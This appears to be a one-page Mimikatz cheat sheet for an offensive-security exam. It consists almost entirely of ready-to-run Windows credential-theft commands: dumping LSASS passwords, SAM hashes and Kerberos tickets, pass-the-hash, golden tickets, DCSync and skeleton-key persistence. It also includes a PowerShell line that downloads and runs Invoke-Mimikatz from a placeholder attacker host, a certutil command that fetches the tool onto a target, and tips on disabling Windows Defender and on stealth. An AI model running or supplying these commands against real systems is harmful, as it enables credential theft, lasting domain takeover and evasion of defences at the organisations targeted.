# MIMIKATZ ONE-PAGE CHEAT SHEET

## MOST COMMAND (90% of use)
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

## DUMP EVERYTHING
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "sekurlsa::tickets /export" "exit"

## PASS THE HASH
mimikatz.exe "sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:HASH" "exit"

## GOLDEN TICKET
mimikatz.exe "kerberos::golden /domain:domain.local /sid:SID /krbtgt:HASH /user:Administrator /ticket:golden.kirbi" "exit"

## DCSYNC
mimikatz.exe "lsadump::dcsync /user:krbtgt" "exit"

## LOAD TICKET
mimikatz.exe "kerberos::ptt ticket.kirbi" "exit"

## SKELETON KEY (on DC)
mimikatz.exe "privilege::debug" "misc::skeleton" "exit"

## LSASS DUMP OFFLINE
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"

## INVOKE-MIMIKATZ (PowerShell)
IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds

## PYPYKATZ (Python, no mimikatz)
pypykatz lsa minidump lsass.dmp

## UPLOAD TO TARGET
certutil -urlcache -f http://YOUR_IP/mimikatz.exe mimikatz.exe

## QUICK WIN COMMAND
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" | findstr "NTLM"

1. **ALWAYS** run `privilege::debug` first - it's required for everything

2. **Mimikatz must run as Administrator** - if not, elevate first

3. **Windows Defender on exam machines** - may need to disable or use Invoke-Mimikatz

4. **Keep multiple copies** - have mimikatz.exe, mimikatz_x86.exe, and Invoke-Mimikatz.ps1 ready

5. **Practice offline analysis** - use pypykatz on dumps

6. **Document everything** - exam requires proof of commands and output

7. **Don't overcomplicate** - 90% of the time you just need `sekurlsa::logonpasswords`

8. **Golden tickets persist** - even after password changes, golden tickets still work

9. **DCSync is stealthy** - doesn't touch LSASS on Domain Controller

10. **When in doubt, dump LSASS** - analyze offline on your attacker machine